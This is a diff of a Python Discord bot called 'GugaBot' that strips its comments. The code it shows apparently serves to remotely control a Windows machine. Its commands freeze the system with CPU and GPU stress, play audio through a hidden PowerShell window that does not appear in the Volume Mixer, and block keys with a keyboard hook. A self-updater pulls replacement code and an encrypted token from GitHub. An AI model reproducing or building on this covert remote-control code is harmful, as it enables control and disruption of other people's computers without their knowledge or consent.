@@ -9,13 +9,13 @@ import psutil
 import io
 import urllib.request
 
-# Force UTF-8 output so emojis don't crash on Windows cp1252
+
 if sys.stdout.encoding != "utf-8":
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
 if sys.stderr.encoding != "utf-8":
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
 
-#  Single instance lock 
+
 import tempfile
 _lock_path = os.path.join(tempfile.gettempdir(), "gugabot.lock")
 try:
@@ -33,13 +33,12 @@ except Exception as e:
     print(f" Lock file error: {e}")
 
 
-# Windows-only
+
 if sys.platform == "win32":
     import ctypes
 
-# 
-# CONFIG  decrypts token.enc using dependencies.txt
-# 
+
+
 try:
     from cryptography.fernet import Fernet
     _dir = os.path.dirname(os.path.abspath(__file__))
@@ -66,21 +65,13 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 
-#  Auth helpers 
+
 
 def authorized(user_id: int) -> bool:
     return user_id in AUTHORIZED_USERS
 
 async def deny(interaction: discord.Interaction):
     await interaction.response.send_message(" You're not authorized.", ephemeral=True)
-
-
-#  on_ready defined below with check_update
-
-
-# 
-# PREFIX COMMANDS
-# 
 
 @bot.command(name="help")
 async def help_cmd(ctx):
@@ -129,11 +120,7 @@ async def help_cmd(ctx):
         "`/stream stop`  stop streaming"
     ), inline=False)
     await ctx.send(embed=embed)
-
-
-# 
-# SLASH COMMANDS
-# 
+ 
 
 #  /ping 
 @bot.tree.command(name="ping", description="Check if the bot is alive")
@@ -518,7 +505,7 @@ async def freeze(interaction: discord.Interaction, seconds: int = 5):
         for _ in range(cpu_count)
     ]
 
-    # GPU stress via DirectX pixel shader  compiled C# inline
+
     gpu_script = r"""
 Add-Type -TypeDefinition @"
 using System;
@@ -573,8 +560,6 @@ async def play_audio_hidden(url: str, filename: str):
             with open(tmp_path, "wb") as f:
                 f.write(await resp.read())
 
-    # Convert to wav if needed using soundfile, then play via PowerShell SoundPlayer
-    # PowerShell SoundPlayer only supports wav, so convert first
     try:
         import soundfile as sf
         data, samplerate = sf.read(tmp_path, dtype="float32")
@@ -585,7 +570,6 @@ async def play_audio_hidden(url: str, filename: str):
         wav_path = tmp_path
         duration = 0
 
-    # Play via PowerShell  shows as nothing in Volume Mixer
     script = f"(New-Object Media.SoundPlayer '{wav_path}').PlaySync()"
     proc = subprocess.Popen(
         ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script],
@@ -620,7 +604,7 @@ async def soundboard(interaction: discord.Interaction, file: discord.Attachment)
         await interaction.followup.send(f" Error: {e}")
 
 
-#  !soundboard (prefix fallback) 
+#  !soundboard 
 @bot.command(name="soundboard")
 async def soundboard_prefix(ctx):
     if not authorized(ctx.author.id):
@@ -644,8 +628,7 @@ async def blockkey(interaction: discord.Interaction, key: str, seconds: int = 10
         return await deny(interaction)
     await interaction.response.send_message(f" Blocking `{key}` for `{seconds}s`...")
 
-    # Use PowerShell to install and run a key block via RegisterHotKey suppression
-    # Works by spamming a hook that eats the keypress
+
     script = f"""
 Add-Type -TypeDefinition @'
 using System;
@@ -694,7 +677,7 @@ public class KeyBlocker {{
     await interaction.followup.send(f" `{key}` unblocked.")
 
 
-#  /blockkey prefix fallback 
+
 @bot.command(name="blockkey")
 async def blockkey_prefix(ctx, key: str = "f", seconds: int = 10):
     if not authorized(ctx.author.id):
@@ -885,11 +868,6 @@ async def stream_prefix(ctx, action: str = "start"):
                 await ctx.send(f" {e}")
                 break
             await asyncio.sleep(3)
-
-
-# 
-# PREFIX FALLBACKS FOR ALL SLASH COMMANDS
-# 
 
 @bot.command(name="ping")
 async def ping_prefix(ctx):
@@ -1131,9 +1109,7 @@ async def freeze_prefix(ctx, seconds: int = 5):
     await ctx.send(" Done freezing.")
 
 
-# 
-# AUTO-UPDATER
-# 
+
 UPDATE_URL = "https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py"
 
 def check_update():
@@ -1141,13 +1117,12 @@ def check_update():
         import urllib.request
         _dir = os.path.dirname(os.path.abspath(__file__))
 
-        # Update Bot.py
+
         with urllib.request.urlopen("https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py") as r:
             remote = r.read()
         with open(os.path.abspath(__file__), "rb") as f:
             local = f.read()
 
-        # Always re-download token.enc in case token was rotated
         with urllib.request.urlopen("https://raw.githubusercontent.com/Exly78/GugaBot/main/token.enc") as r:
             with open(os.path.join(_dir, "token.enc"), "wb") as f:
                 f.write(r.read())
@@ -1215,5 +1190,4 @@ async def update_prefix(ctx):
         await ctx.send(f" Error: {e}")
 
 
-# 
 bot.run(BOT_TOKEN)
